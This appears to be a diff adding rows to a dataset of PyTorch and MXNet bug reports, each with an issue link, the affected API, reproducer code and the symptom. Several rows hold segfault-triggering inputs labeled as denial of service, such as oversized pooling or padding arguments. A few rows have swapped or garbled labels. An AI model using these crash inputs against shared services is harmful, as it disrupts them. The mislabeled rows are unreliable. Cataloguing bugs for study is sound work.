+import torch.multiprocessing as mp 
+
+
+def worker_fn(rank):
+    print(f""Hello from rank {rank}"")
+    os.environ['MASTER_ADDR'] = '127.0.0.1'
+    os.environ['MASTER_PORT'] = '29500'
+    dist.init_process_group(backend='gloo', rank=rank, world_size=2)
+    dist.barrier()
+
+    if rank == 0:
+        # Source rank
+        my_array = np.reshape(np.arange(10), (2, 5))
+        my_array = np.transpose(my_array, (1, 0))
+        my_tensor = torch.from_numpy(my_array).to(torch.float32)
+        dist.gather(my_tensor, dst=1)
+        print(""Sent tensor     = "" + str(my_tensor.tolist()))
+    elif rank == 1:
+        # Destination rank
+        not_used = torch.zeros((5, 2))
+        results = [torch.zeros((5, 2)) for _ in range(2)]
+        dist.gather(not_used, gather_list=results, dst=1)
+        # Printing tensor from rank 0
+        print(""Received tensor = "" + str(results[0].tolist()))
+
+
+if __name__ == ""__main__"":
+    processes = []
+    mp.set_start_method(""spawn"")
+    for rank in range(2):
+        p = mp.Process(target=worker_fn, args=(rank,))
+        p.start()
+        processes.append(p)
+    for p in processes:
+        p.join()",N.A,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/73196,N.A,torch,torch.pow,Negative argument,"import torch
+
+x = torch.tensor(0, device=""cuda"", dtype=torch.int32)
+y = torch.tensor(-1)
+o = torch.pow(x, y)",y,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/73191,N.A,torch,torch.max_pool3d,Very large input argument,"import torch
+
+self = torch.full((1, 1, 1, 1, 1,), 1.5e+300, dtype=torch.float64, requires_grad=False)
+kernel_size = [536870912, 536870912, 536870912]
+stride = [1, 1, 1]
+padding = [0, 0, 0]
+dilation = [1879048192, 1879048192, 1879048192]
+ceil_mode = True
+torch.max_pool3d(self, kernel_size, stride, padding, dilation, ceil_mode)","kernel_size, dilation",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/73190,N.A,torch,torch.max_pool1d,Very large input argument,"import torch
+
+self = torch.full((2, 10, 4,), 0.5, dtype=torch.float64, requires_grad=False)
+kernel_size = [1250999896764]
+stride = [1250999896764]
+padding = [0]
+dilation = [1250999896764]
+ceil_mode = True
+torch.max_pool1d(self, kernel_size, stride, padding, dilation, ceil_mode)","kernel_size, stride, dilation",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/73186,N.A,torch,torch._C._nn.fractional_max_pool3d,Zero element ,"import torch
+
+self = torch.full((2, 4, 5, 5, 5,), 1, dtype=torch.float64, requires_grad=False)
+kernel_size = [0, 0, 0]
+output_size = [0, 0, 0]
+random_samples = torch.full((2, 4, 5, 5, 5,), 1, dtype=torch.float64, requires_grad=False)
+torch._C._nn.fractional_max_pool3d(self, kernel_size, output_size, random_samples)",output_size,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/73185,N.A,torch,torch._C._nn.fractional_max_pool2d,Zero element ,"import torch
+
+self = torch.full((1, 3, 7, 6,), 1, dtype=torch.float64, requires_grad=False)
+kernel_size = [0, 0]
+output_size = [0, 0]
+random_samples = torch.full((1, 3, 7, 6,), 1, dtype=torch.float64, requires_grad=False)
+torch._C._nn.fractional_max_pool2d(self, kernel_size, output_size, random_samples)",output_size,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/73182,N.A,torch,torch._sobol_engine_scramble_,Very large input argument,"import torch
+
+self = torch.full((100, 30,), 1, dtype=torch.int64, requires_grad=False)
+ltm = torch.full((100, 30, 30,), 1, dtype=torch.int64, requires_grad=False)
+dimension = 1250999896764
+torch._sobol_engine_scramble_(self, ltm, dimension)",dimension,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/73181,N.A,torch,torch._sobol_engine_initialize_state_,Very large input argument,"import torch
+
+self = torch.full((2, 30,), 1, dtype=torch.int64, requires_grad=False)
+dimension = 1250999896764
+torch._sobol_engine_initialize_state_(self, dimension)",dimension,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/73180,N.A,torch,torch._sobol_engine_ff_,Very large input argument,"import torch
+
+self = torch.full((2,), 1, dtype=torch.int64, requires_grad=False)
+n = 1250999896764
+sobolstate = torch.full((2, 30,), 1, dtype=torch.int64, requires_grad=False)
+dimension = 1250999896764
+num_generated = 0
+torch._sobol_engine_ff_(self, n, sobolstate, dimension, num_generated)","dimension, n",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/71689,N.A,torch.distributions.categorical,torch.distributions.categorical.Categorical,Zero argument,batch_sizes = 0,batch_sizes,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71678,N.A,torch,torch.bmm,Sparse tensor,"import torch
+a = torch.rand(2, 3, 3).to_sparse().requires_grad_(True)
+b = torch.rand(2, 3, 3)
+c = torch.bmm(a, b)",a ,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71636,N.A,torch,torch.median,Empty input,"import torch
+input = torch.randint(-2,2,[0], dtype=torch.int32)
+print(torch.median(input))",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.cummin,Empty input,"input = torch.rand([], dtype=torch.float64)
+dim = 100
+torch.cummin(input, dim)",input,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.cummax,Empty input,N.A,input,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.sort,Empty input,N.A,input,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.argsort,Empty input,N.A,input,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71470,N.A,torch.jit,torch.jit.script,N.A,"import torch
+
+mha0 = torch.nn.MultiheadAttention(256, 4)
+script_mha0 = torch.jit.script(mha0)
+print(""Successful compiled mha0"")
+
+mha1 = torch.nn.MultiheadAttention(256, 4, kdim=128, vdim=128)
+script_mha1 = torch.jit.script(mha1)
+print(""Successful compiled mha1"")","kdim
+vdim",N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71204,N.A,torch,torch.diag,Dimension mismatch,"import torch
+a = torch.tensor([[0, 1], [2, 3]])
+for i in [0, 1, 2]:
+    assert(torch.equal(torch.diag(a, i), torch.diagonal(a, i)))
+torch.diagonal(a, 3)
+torch.diag(a, 3)",N.A,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71204,N.A,torch,torch.diagonal,Dimension mismatch,"import torch
+a = torch.tensor([[0, 1], [2, 3]])
+for i in [0, 1, 2]:
+    assert(torch.equal(torch.diag(a, i), torch.diagonal(a, i)))
+torch.diagonal(a, 3)
+torch.diag(a, 3)",N.A,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71082,N.A,torch,torch.combinations,Dimension mismatch,"import torch
+input_tensor = torch.randint(-1,1,[3], dtype=torch.int64)
+input = input_tensor.clone()
+r = 100
+print(torch.combinations(input, r=r))",r,N.A,N.A,crash
+Pytorch,https://github.com/pytorch/pytorch/issues/71078,N.A,torch,torch.nn.ConstantPad2d,Zero dimensional tensor,"import torch
+padding = [-1, -2, 1, 1]
+c1 = torch.nn.ReflectionPad2d(padding)
+c2 = torch.nn.ReplicationPad2d(padding)
+c3 = torch.nn.ConstantPad2d(padding, 0)
+c4 = torch.nn.ZeroPad2d(padding)
+input = torch.rand([1, 1, 3, 3], dtype=torch.float32)
+
+print(c1(input))
+print(c2(input))
+c3(input)
+# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.
+c4(input)
+# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.",input,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71078,N.A,torch,torch.nn.ZeroPad2d,Zero dimensional tensor,"import torch
+padding = [-1, -2, 1, 1]
+c1 = torch.nn.ReflectionPad2d(padding)
+c2 = torch.nn.ReplicationPad2d(padding)
+c3 = torch.nn.ConstantPad2d(padding, 0)
+c4 = torch.nn.ZeroPad2d(padding)
+input = torch.rand([1, 1, 3, 3], dtype=torch.float32)
+
+print(c1(input))
+print(c2(input))
+c3(input)
+# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.
+c4(input)
+# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.",input,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/71059,N.A,torch,torch.scatter,Empty input,"import torch
+input = torch.rand([])
+dim = 0
+index = torch.tensor([]) # or torch.tensor([0])
+src = torch.rand([])
+torch.scatter(input, dim, index, src)
+# random value like tensor(6.7333e+22)",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/71058,N.A,torch,torch.where,Float dtype,"import torch
+condition= torch.randint(0,2,[2, 2], dtype=torch.bool)
+x= torch.rand([2, 2], dtype=torch.float64)
+y = 0.0
+print( torch.where(condition, x, y) )
+# tensor([[0.0000, 0.6290],
+#        [0.0000, 0.0000]], dtype=torch.float64)
+print( x.where(condition, y) )
+# TypeError: where(): argument 'other' (position 2) must be Tensor, not float",y,N.A,N.A,type error
+Pytorch,https://github.com/pytorch/pytorch/issues/70901,N.A,torch,torch.batch_norm_gather_stats_with_counts,Half dtype,"import torch
+i = torch.rand([5,4,10,10], dtype=torch.float).cuda()
+c = torch.rand((150,), dtype=torch.half).fill_(500).cuda()
+m = torch.rand([150, 4], dtype=torch.float).cuda()
+rm = torch.rand([4], dtype=torch.half).cuda()
+v = torch.rand([150, 4], dtype=torch.float).cuda()
+v += 0.0001
+rv = torch.rand([4], dtype=torch.half).cuda()
+rv += 0.0001
+mea, inv = torch.batch_norm_gather_stats_with_counts(i, m, v, rm, rv, 1.2, 0.001, c)
+print(mea)",count,N.A,overflow,crash
+Pytorch,https://github.com/pytorch/pytorch/issues/70672,N.A,torch,torch.as_strided,N.A,"import torch
+a = torch.rand([3, 3])
+b = torch.as_strided(a, [1, -1], [1, 1])
+print(b.shape)
+# torch.Size([1, -1])",N.A,N.A,N.A,wrong results
+,https://github.com/pytorch/pytorch/issues/70398,N.A,torch,tensor.expand,Negative argument,"import torch
+input = torch.rand([3])
+shape = [-2, 3]
+res = torch.broadcast_to(input,shape,)
+print(res.shape)
+# torch.Size([-2, 3])
+print(torch.sum(res))
+# tensor(0.)
+torch.all(res)
+# RuntimeError: Trying to create tensor with negative dimension -2: [-2, 3]",shape,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/70398,N.A,torch,torch.broadcast_to,Negative argument,"import torch
+input = torch.rand([3])
+shape = [-2, 3]
+res = input.expand(shape)
+print(res.shape)
+print(torch.sum(res))
+torch.all(res)",shape,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/70397,N.A,torch,torch.empty_strided,Negative argument,"import torch
+size = [2, 3]
+stride = [-1, 2]
+res = torch.empty_strided(size,stride,)
+print(torch.sum(res))
+# tensor(nan)
+print(res.shape)
+# torch.Size([2, 3])
+print(res)",stride,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/69433,N.A,torch,torch.transpose,Zero dimensional tensor,"import torch
+tensor = torch.rand(torch.Size([]))
+res1 = torch.transpose(tensor, 0, 0)","dim0, dim1",N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/69408,N.A,torch,torch.hstack,Zero dimensional tensor,"import torch
+tensor_0 = torch.rand(torch.Size([]))
+tensor_1 = torch.rand(torch.Size([3]))
+tensors = [tensor_0, tensor_1]
+res1 = torch.hstack(tensors)
+# succeed
+res2 = torch.cat(tensors, dim=0)",dim=0,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/68610,N.A,torch,torch.unique_consecutive,Positional argument,"torch.unique_consecutive(torch.ones(5), True, True)
+torch.unique_consecutive(torch.ones(5), return_inverse=True)
+torch.unique_consecutive(torch.ones(5), return_counts=True)","return_inverse
+return_counts",N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/67081,N.A,torch.utils,torch.utils.dlpack.to_dlpack,Boolean dtype,"torch.utils.dlpack.to_dlpack(torch.BoolTensor([False, True])) ",ext_tensor,N.A,N.A,fails
+Pytorch,https://github.com/pytorch/pytorch/issues/65683,N.A,torch.nn,torch.nn.functional.l1_loss,Complex dtype,"import torch
+from torch.autograd import gradgradcheck
+from torch.nn.functional import l1_loss
+
+input = torch.randn((), dtype=torch.complex128, requires_grad=True)
+target = torch.randn((), dtype=torch.complex128)
+
+gradgradcheck(l1_loss, inputs=(input, target))","input
+target",N.A,N.A,fails
+Pytorch,https://github.com/pytorch/pytorch/issues/65400,N.A,torch.sparse,torch.sparse.sum,Positional argument specified,"t = torch.tensor(1).to_sparse()
+torch.sparse.sum(t, dim=0)",dim,N.A,N.A,fails
+Pytorch,https://github.com/pytorch/pytorch/issues/65050,N.A,torch,torch.cross,Equal input,"a = torch.Tensor([0.7533, 0.6123, -0.2404])
+b = torch.Tensor([0.7533, 0.6123, -0.2404])
+c = torch.cross(a, b)
+print(c)","a, b",N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/64978,N.A,torch,torch.nn.functional.linear,Rank other than 2,"import torch
+a = torch.ones([1,1,10])
+b = torch.ones([10])   # weight is 1-d
+c = torch.nn.functional.linear(a, b)",b,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/64079,N.A,torch,torch.equal,Sparse tensor,"if __name__ == ""__main__"":
+    x = torch.rand(4, 4).to_sparse()
+    assert torch.equal(x, x)",x,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/59439,N.A,torch.nn.functional,torch.nn.functional.conv2d,NaN input,"import torch
+import torch.nn.functional as F
+
+print(F.conv2d(torch.ones(1,3,160,240).cpu(), torch.ones(1,3,3,3).cpu()))","inputs, filters",N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/54638,N.A,torch.jit,torch.jit.trace,Sparse tensor,"import torch
+
+### LAYER and GCN DEFINITION
+
+class HiddenLayerSparse(torch.nn.Module):
+    def __init__(self, dimf_in, dimf_out):
+        super().__init__()
+        self.weights = torch.nn.Parameter(torch.rand(dimf_in, dimf_out, dtype=float))
+
+    def forward(self, adj, x):
+        x = torch.mm(x, self.weights)
+        x = torch.mm(adj, x)
+        return x
+
+class ExampleSparseGCN(torch.nn.Module):
+    def __init__(self, sizes):
+        super().__init__()
+        self.sizes = sizes
+        self.hidden_layers = torch.nn.ModuleList([HiddenLayerSparse(sizes[i], sizes[i+1]) for i in range(len(sizes)-1)])
+        self.nonlinear = torch.nn.ReLU()
+        self.softmax = torch.nn.Softmax(dim=1)
+
+    def forward(self, adj, x):
+        for h in self.hidden_layers:
+            x = self.nonlinear(h(adj, x))
+        return self.softmax(x)
+
+### EXAMPLE SPARSE INPUTS
+
+adjacency = torch.tensor([[1,0],[0,1]], dtype=float).to_sparse()
+features = torch.tensor([[1,0,0,1,0],[0,1,0,0,1]],dtype=float).to_sparse()
+labels = torch.tensor([[1,0,0], [0,1,0]],dtype=float)
+inputs = (adjacency, features)
+
+model = ExampleSparseGCN([5, 4, 3]) # training does not fail with [5,3]
+loss_fn =  torch.nn.L1Loss()
+optimizer = torch.optim.SGD(model.parameters(), lr=0.05)
+
+_train = False      # FLAG TO ENABLE TRAINING
+_trace = True      # FLAG TO ENABLE TRACING
+
+# TRAINING 
+if _train:
+    model.train()
+    for t in range(50):
+        optimizer.zero_grad()
+        output = model(*inputs)
+        loss = loss_fn(output, labels)
+        loss.backward()
+        optimizer.step() 
+    print('Train Complete')
+
+# TRACING
+if _trace:
+    model.eval()
+    with torch.no_grad():
+        #torch.onnx.export(model, inputs, path, do_constant_folding=True, verbose=True, export_params=True)
+        traced = torch.jit.trace(model, inputs)
+    print('Trace Complete')",input,N.A,N.A,fails
+Pytorch,https://github.com/pytorch/pytorch/issues/54620,N.A,torch,torch.pow,Boolean dtype,"import torch
+
+input = torch.zeros(10, dtype=torch.bool)
+exponent = torch.zeros(10, dtype=torch.bool)
+torch.pow(input, exponent)","input, exponent",N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/54499,N.A,torch.nn,torch.nn.MaxPool1d,Very large input argument,"import torch
+
+m=torch.nn.MaxPool1d(545646544,stride=2)
+input=input=torch.randn(20,16,50)
+m(input)",kernel_size,N.A,integer overflow,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/53407,N.A,torch,torch.matmul,Empty input,torch.matmul(input),input,N.A,N.A,failure
+Pytorch,https://github.com/pytorch/pytorch/issues/53391,N.A,torch,torch.empty_strided,Negative argument,torch.empty_strided(),stride,N.A,N.A,failure
+Pytorch,https://github.com/pytorch/pytorch/issues/53358,N.A,torch,torch.cumsum,Boolean dtype,"import torch
+t = torch.tensor([False, True, True])
+t.cumsum(0)
+t.cumsum_(0)",input,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/51911,N.A,torch.nn.functional,torch.nn.functional.grid_sample,Very large input argument,"import torch
+torch.nn.functional.grid_sample(input=torch.ones([1,1,1,5]), grid=torch.tensor([[[[ 2.9839e+38, -3.2406e+38]]]]))",grid,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/51906,N.A,torch.nn.functional,torch.nn.functional.binary_cross_entropy_with_logits,Empty input,"import torch
+torch.nn.functional.binary_cross_entropy_with_logits(input=torch.tensor([-2.3135e+307,  6.6756e+307]), target=torch.ones((2)))",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/51906,N.A,torch.nn.functional,torch.nn.functional.binary_cross_entropy_with_logits,Very large input argument,"import torch
+torch.nn.functional.binary_cross_entropy_with_logits(input=torch.tensor([]), target=torch.tensor([]))",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/51803,N.A,torch.nn.functional,torch.nn.functional.binary_cross_entropy,Empty input,"import torch
+torch.nn.functional.binary_cross_entropy(input=torch.tensor([]), target=torch.tensor([]))",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/51732,N.A,torch.nn.functional,torch.nn.functional.ctc_loss,Large negative number,"import torch 
+torch.nn.functional.ctc_loss(log_probs=torch.ones((1,2,1)), targets=torch.ones((2,1)), input_lengths=torch.tensor([-5570080269274466818, -1]), target_lengths=torch.tensor((1,1)))",input_lengths,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/51134,N.A,torch.nn,torch.nn.ReplicationPad3d,Very large input argument,"import torch
+layer = torch.nn.ReplicationPad3d(padding=498444555)
+model_input = torch.ones([1, 1, 1, 1, 1])
+layer(model_input)",padding,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/49520,N.A,torch.nn,torch.nn.ReplicationPad2d,Very large input argument,"import torch
+layer = torch.nn.ReplicationPad2d(padding=1012756988)
+model_input = torch.ones([2,2,2,2])
+layer(model_input)",padding,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/47610,N.A,torch,torch.gather,Dimension mismatch,"import torch
+torch.manual_seed(0)
+input = torch.rand(4, 2)
+index = torch.randint(2, size=(4,)).unsqueeze(0)  # intended to be unsqueeze(1)
+dim = 1
+output = torch.gather(input, dim, index)
+print(""input = "", input)
+print(""index = "", index)
+print(""output = "", output)","index
+input",N.A,N.A,N.A
+Pytorch,https://github.com/pytorch/pytorch/issues/46225,N.A,torch,torch.mode,NaN input,"def test(device):
+    x = torch.rand(1000).mul(5).long().to(device)
+    s = torch.bincount(x, minlength=5).argsort(descending=True)
+    
+    mode =  x.mode().values
+    print(f'w/o nans, got {mode}, expected {s[0]}')
+
+    y = x.clone().float()
+    y[y == mode] = np.nan
+    mode =  y.mode().values.long()
+    print(f'w nans, got {mode}, expected {s[1]}')",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/43567,N.A,torch,torch.svd,NaN input,"torch.svd(torch.tensor([[float('nan'), 1.0]]).cuda())",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/43115,N.A,torch,torch.multinomial,Very large input argument,"import torch
+for ncat in (2**8, 2**22, 2**24):
+    probs=torch.empty(ncat) 
+    half = ncat//2    
+    probs[half:]=1
+    probs[:half-1]=2
+    out=torch.multinomial(probs, num_samples=10**5, replacement=True) 
+    print(""number of categories {:10}, number of samples in upper half {:8} "".format(ncat, (out>=half).sum().item())) #would expect 1/3 (~33333) of generated values to be >=half, true for ncat 2**8, 2**22, 0 for ncat 2**24",num_samples,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/37556,N.A,torch,torch.cartesian_prod,Rank other than 1,"a = [[1,1], [2,3], [3,5]]
+b = [[4, 5], [3,6]]
+print(list(itertools.product(a, b)))
+tensor_a = torch.tensor(a)
+tensor_b = torch.tensor(b)
+#torch.cartesian_prod(tensor_a, tensor_b)
+torch.cartesian_prod(tensor_a, tensor_b)",tensors,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/29372,N.A,torch,torch.std,Scalar tensor,"import numpy as np
+np.std(4) # returns 0
+import torch
+torch.std(torch.tensor(4.)) # returns NaN",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/25648,N.A,torch,torch.cat,Negative argument,"import torch 
+from torch import nn
+
+device = torch.device('cuda') # crashes with cuda, works with cpu
+
+class Model(nn.Module):
+
+    def __init__(self):
+        super().__init__()
+        self.linear1 = nn.Linear(2, 16)
+        self.linear2 = nn.Linear(2, 16)
+
+    def forward(self, x, y):
+        x = self.linear1(x)
+        y = self.linear2(y)
+        return torch.cat([x, y], dim=-1) # if we replace -1 with 1 works fine with either GPU or CPU
+
+model = Model().to(device)
+
+data = [torch.randn(1, 2).to(device), torch.randn(1, 2).to(device)] 
+
+traced = torch.jit.trace(model, data)
+
+print(traced)",dim,N.A,N.A,crash
+Pytorch,https://github.com/pytorch/pytorch/issues/24823,N.A,torch.nn.functional,torch.nn.functional.grid_sample,Invalid argument,"import torch
+
+image = torch.rand(1, 1, 3, 3, device='cpu')
+grid = torch.rand(1, 3, 3, 2, device='cpu')
+grid[:,1,1,0] = float('nan')
+torch.nn.functional.grid_sample(image, grid, padding_mode='reflection')",padding_mode,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/24823,N.A,torch.nn.functional,torch.nn.functional.grid_sample,Invalid argument,"import torch
+
+image = torch.rand(1, 1, 3, 3, device='cpu')
+grid = torch.rand(1, 3, 3, 2, device='cpu')
+grid[:,1,1,0] = float('nan')
+torch.nn.functional.grid_sample(image, grid, padding_mode='border')",padding_mode,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/23159,N.A,torch,torch.sum,dim >= 64,"import torch
+sizes = [1]*65
+x = torch.randn(sizes)
+x.sum(0)
+x.sum(65)",dim,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/23061,N.A,torch,torch.einsum,Float16 dtype,"import os
+os.environ['CUDA_VISIBLE_DEVICES']='0'
+import torch
+from time import time
+
+a = torch.empty(24,32,40,48, dtype=torch.float32).to('cuda')
+b = torch.empty(64,32,40,48, dtype=torch.float32).to('cuda')
+c = torch.empty(40,80,24, dtype=torch.float32).to('cuda')
+d = torch.empty(40,24,16, dtype=torch.float32).to('cuda')
+
+st = time()
+for _ in range(1000):
+    c.matmul(d)
+print(time()-st)
+
+st = time()
+for _ in range(1000):
+    torch.einsum('ibnd,jbnd->ijbn', a, b)
+print(time()-st)",operands,N.A,N.A,Slow
+Pytorch,https://github.com/pytorch/pytorch/issues/22788,N.A,torch,torch.matmul,Float16 dtype,"import os
+os.environ['CUDA_VISIBLE_DEVICES']='0'
+import torch
+from time import time
+
+
+a = torch.empty(24,32,40,48, dtype=torch.float16).to('cuda')
+b = torch.empty(64,32,40,48, dtype=torch.float16).to('cuda')
+c = torch.empty(40,80,24, dtype=torch.float16).to('cuda')
+d = torch.empty(40,24,16, dtype=torch.float16).to('cuda')
+
+st = time()
+for _ in range(1000):
+    torch.matmul(c,d)
+print(time()-st)
+
+st = time()
+for _ in range(1000):
+    torch.einsum('ibnd,jbnd->ijbn', a, b)
+print(time()-st)",operands,,,Slow
+Pytorch,https://github.com/pytorch/pytorch/issues/22105,N.A,torch,torch.zeros,Pandas indice,"import numpy as np
+import torch
+import pandas as pd
+
+
+idx = pd.core.indexes.numeric.Int64Index(np.arange(10000))
+arr = torch.zeros(len(idx))
+
+while True:
+    arr[idx]",size,N.A,N.A,memory leak
+Pytorch,https://github.com/pytorch/pytorch/issues/17897,N.A,torch,torch.mv,Very large input argument,"x = torch.ones(35783, 65133, device='cuda')
+y = torch.randn(65133, device='cuda')
+z = torch.mv(x, y)
+torch.cuda.synchronize()  # report asynchronous error","input
+vec",N.A,N.A,illegal memory access
+Pytorch,https://github.com/pytorch/pytorch/issues/17350,N.A,torch.nn,torch.nn.CrossEntropyLoss,mean input,"import numpy as np
+import torch
+
+outputs = np.random.rand(16, 1, 256, 256)
+outputs = np.hstack((outputs, 1.0 - outputs))
+targets = np.random.randint(2, size=(16, 256, 256))
+
+seed = 0
+torch.backends.cudnn.deterministic = True
+torch.backends.cudnn.benchmark = False
+
+for reduction in ['none', 'sum', 'mean']:
+    print(reduction)
+
+    for i in range(10):
+        torch.manual_seed(seed)
+        np.random.seed(seed)
+
+        outputs_t, targets_t = torch.from_numpy(outputs), torch.from_numpy(targets)
+        outputs_t, targets_t = outputs_t.cuda(0), targets_t.cuda(0)
+
+        loss_fn = torch.nn.CrossEntropyLoss(reduction=reduction)
+        loss_fn = loss_fn.cuda(0)
+
+        loss = loss_fn(outputs_t, targets_t)
+        loss = loss.detach().cpu().numpy()
+        print(i, outputs.sum(), targets.sum(), outputs.mean(), targets.mean(), loss.sum(), loss.mean())",reduction,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/15728,N.A,torch.nn,torch.nn.CrossEntropyLoss,sum input,"""import numpy as np
+import torch
+
+outputs = np.random.rand(16, 1, 256, 256)
+outputs = np.hstack((outputs, 1.0 - outputs))
+targets = np.random.randint(2, size=(16, 256, 256))
+
+seed = 0
+torch.backends.cudnn.deterministic = True
+torch.backends.cudnn.benchmark = False
+
+for reduction in ['none', 'sum', 'mean']:
+    print(reduction)
+
+    for i in range(10):
+        torch.manual_seed(seed)
+        np.random.seed(seed)
+
+        outputs_t, targets_t = torch.from_numpy(outputs), torch.from_numpy(targets)
+        outputs_t, targets_t = outputs_t.cuda(0), targets_t.cuda(0)
+
+        loss_fn = torch.nn.CrossEntropyLoss(reduction=reduction)
+        loss_fn = loss_fn.cuda(0)
+
+        loss = loss_fn(outputs_t, targets_t)
+        loss = loss.detach().cpu().numpy()
+        print(i, outputs.sum(), targets.sum(), outputs.mean(), targets.mean(), loss.sum(), loss.mean())""        reduction        N.A        segfault        Denial of service",reduction,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/7343,N.A,torch.autograd,torch.autograd.grad,Invalid argument,"torch.manual_seed(2332)
+dim = 10
+winit = torch.randn([dim])
+w1 = torch.randn([dim+1],requires_grad=True)
+w2 = w1[dim:]
+torch.autograd.set_detect_anomaly(True)
+
+for e in range(1000):
+    param0 = winit.clone().detach().requires_grad_()
+
+    p = torch.sum((param0-w2)*(param0-w2))
+    param0grad = torch.autograd.grad(p,param0,create_graph=True)[0] #mem leak
+    param1 = param0 - 0.1*param0grad
+
+    del param1
+    del param0grad
+    del p
+    del param0
+    gc.collect()
+
+    if (e%100==0): 
+        p = psutil.Process()
+        mem_info = p.memory_info()
+        print('epoch ',e,' mem info ',mem_info)",create_graph,N.A,N.A,memory leak
+Pytorch,https://github.com/pytorch/pytorch/issues/7343,N.A,torch.autograd,torch.autograd.grad,Invalid argument,"x = torch.randn(1, device='cuda', requires_grad=True)
+y = x.tanh()
+y.backward(torch.ones_like(y), create_graph=True)",create_graph,N.A,N.A,memory leak
+MXNet,https://github.com/apache/incubator-mxnet/issues/20959,N.A,gluon.data,gluon.data.DataLoader,num_workers > 0,"import mxnet.gluon as gl
+import mxnet as mx
+import gc
+
+if __name__ == ""__main__"":
+    gpu_ctx = mx.gpu()
+    model = gl.nn.Embedding(10, 5)
+    model.initialize(ctx=gpu_ctx)
+    X = mx.random.uniform(shape=(1000, 3))
+    dataset = mx.gluon.data.dataset.ArrayDataset(X)
+    num_workers_list = [0, 4, 8]
+    for num_workers in num_workers_list:
+
+        for epoch in range(5):
+            dataset = mx.gluon.data.dataset.ArrayDataset(X)
+            data_loader = gl.data.DataLoader(
+                dataset,
+                batch_size=1,
+                num_workers=num_workers,
+            )
+            for batch in data_loader:
+                # move data to gpu
+                data_gpu = batch.copyto(mx.gpu())
+                # forward
+                l = model(data_gpu)
+                # force immediate compute
+                l.asnumpy()
+            # gc & gpu_ctx.empty_cache
+            mx.nd.waitall()
+            del dataset
+            del data_loader
+            gc.collect()
+            gpu_ctx.empty_cache()
+            mx.nd.waitall()
+
+            a, b = mx.context.gpu_memory_info(0)
+            print(f""num_workers: {num_workers} epoch {epoch}: ""
+                  f""current gpu memory {(b - a) / (1024 * 1024 * 1024)} GB, ""
+                  f""Total gpu memory {b / (1024 * 1024 * 1024)} GB."")",num_workers,N.A,N.A,memory leak
